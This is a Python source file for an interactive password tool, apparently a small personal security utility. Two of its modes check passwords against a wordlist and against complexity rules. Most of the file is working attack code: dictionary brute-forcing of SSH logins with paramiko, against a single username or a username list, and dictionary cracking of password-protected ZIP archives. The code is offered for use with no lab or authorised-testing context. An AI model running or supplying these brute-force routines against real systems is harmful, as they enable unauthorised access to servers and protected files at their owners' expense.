import time
import paramiko
import zipfile

def offensive_mode(wordlist_path):
    with open(wordlist_path, 'r', encoding='latin-1') as file:
        for word in file:
            word = word.strip()
            print(word)
            time.sleep(1)  # Adiciona um atraso de 1 segundo entre as palavras

def defensive_mode_password_recognition(input_string, wordlist_path):
    with open(wordlist_path, 'r', encoding='latin-1') as file:
        words = file.read().splitlines()
        if input_string in words:
            print("Password recognized in the word list.")
        else:
            print("Password not found in the word list.")

def defensive_mode_password_complexity(password):
    length_criteria = len(password) >= 8
    capital_criteria = sum(1 for c in password if c.isupper()) >= 1
    number_criteria = sum(1 for c in password if c.isdigit()) >= 1
    symbol_criteria = sum(1 for c in password if not c.isalnum()) >= 1
    
    print(f"Password length criteria: {'Passed' if length_criteria else 'Failed'}")
    print(f"Capital letter criteria: {'Passed' if capital_criteria else 'Failed'}")
    print(f"Number criteria: {'Passed' if number_criteria else 'Failed'}")
    print(f"Symbol criteria: {'Passed' if symbol_criteria else 'Failed'}")
    
    if length_criteria and capital_criteria and number_criteria and symbol_criteria:
        print("SUCCESS: Password meets all complexity criteria.")

def ssh_brute_force(ip, username, wordlist_path):
    with open(wordlist_path, 'r', encoding='latin-1') as file:
        for password in file:
            password = password.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password=password)
                print(f"Successful login: {password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print(f"Failed login: {password}")
            except Exception as e:
                print(f"Error: {e}")
    print("Brute force attack failed. No valid password found.")

def ssh_brute_force_with_userlist(ip, userlist_path, wordlist_path):
    with open(userlist_path, 'r', encoding='latin-1') as users_file:
        usernames = users_file.read().splitlines()

    with open(wordlist_path, 'r', encoding='latin-1') as passwords_file:
        passwords = passwords_file.read().splitlines()

    for username in usernames:
        for password in passwords:
            password = password.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password=password)
                print(f"Successful login: {username}:{password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print(f"Failed login: {username}:{password}")
            except Exception as e:
                print(f"Error: {e}")
    print("Brute force attack failed. No valid username and password combination found.")

def zip_brute_force(zip_path, wordlist_path):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        with open(wordlist_path, 'r', encoding='latin-1') as file:
            for password in file:
                password = password.strip()
                try:
                    zip_ref.extractall(pwd=password.encode('utf-8'))
                    print(f"Password found: {password}")
                    return
                except (RuntimeError, zipfile.BadZipFile):
                    pass
    print("Failed to crack the ZIP file password.")

def main():
    print("Select mode:")
    print("1: Offensive; Dictionary Iterator")
    print("2: Defensive; Password Recognized")
    print("3: Defensive; Password Complexity")
    print("4: SSH Brute Force Attack")
    print("5: SSH Brute Force Attack with User List")
    print("6: ZIP File Brute Force Attack")
    mode = int(input("Enter mode: "))

    if mode == 1:
        wordlist_path = input("Enter word list file path: ")
        offensive_mode(wordlist_path)
    elif mode == 2:
        input_string = input("Enter string to search: ")
        wordlist_path = input("Enter word list file path: ")
        defensive_mode_password_recognition(input_string, wordlist_path)
    elif mode == 3:
        password = input("Enter password to check complexity: ")
        defensive_mode_password_complexity(password)
    elif mode == 4:
        ip = input("Enter SSH server IP address: ")
        username = input("Enter SSH username: ")
        wordlist_path = input("Enter word list file path: ")
        ssh_brute_force(ip, username, wordlist_path)
    elif mode == 5:
        ip = input("Enter SSH server IP address: ")
        userlist_path = input("Enter user list file path: ")
        wordlist_path = input("Enter word list file path: ")
        ssh_brute_force_with_userlist(ip, userlist_path, wordlist_path)
    elif mode == 6:
        zip_path = input("Enter path to ZIP file: ")
        wordlist_path = input("Enter word list file path: ")
        zip_brute_force(zip_path, wordlist_path)
    else:
        print("Invalid mode selected.")

if __name__ == "__main__":
    main()
